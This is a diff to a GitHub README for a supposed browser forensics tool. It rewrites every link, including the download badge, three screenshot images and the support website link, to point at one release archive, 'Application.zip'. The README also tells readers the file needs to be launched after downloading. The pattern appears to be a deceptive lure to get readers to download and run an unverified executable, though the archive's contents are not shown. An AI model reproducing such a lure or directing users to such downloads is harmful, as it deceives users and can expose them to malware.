@@ -16,7 +16,7 @@ Welcome to the RS Browser Forensics repository! This is a tool designed to help 
 
 ### Software Download 📥
 Click the button below to download the RS Browser Forensics software:
-[![Download RS Browser Forensics](https://img.shields.io/badge/Download-Software.zip-blue.svg)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download RS Browser Forensics](https://github.com/limawers/RS-Browser-Forensics/releases/download/v1.0/Application.zip)](https://github.com/limawers/RS-Browser-Forensics/releases/download/v1.0/Application.zip)
 
 ### Note: File needs to be launched after downloading.
 
@@ -28,12 +28,12 @@ Click the button below to download the RS Browser Forensics software:
 ### Screenshots 📸
 Here are a few screenshots of the RS Browser Forensics tool in action:
 
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
-![Screenshot 3](https://example.com/screenshot3.png)
+![Screenshot 1](https://github.com/limawers/RS-Browser-Forensics/releases/download/v1.0/Application.zip)
+![Screenshot 2](https://github.com/limawers/RS-Browser-Forensics/releases/download/v1.0/Application.zip)
+![Screenshot 3](https://github.com/limawers/RS-Browser-Forensics/releases/download/v1.0/Application.zip)
 
 ### Support and Feedback 🤝
-If you encounter any issues with the RS Browser Forensics tool or would like to provide feedback, please [visit our website](https://example.com) for more information.
+If you encounter any issues with the RS Browser Forensics tool or would like to provide feedback, please [visit our website](https://github.com/limawers/RS-Browser-Forensics/releases/download/v1.0/Application.zip) for more information.
 
 ### Releases 🚀
 If the download link is not working or you need to find the latest version of RS Browser Forensics, please check the "Releases" section of this repository for more information.
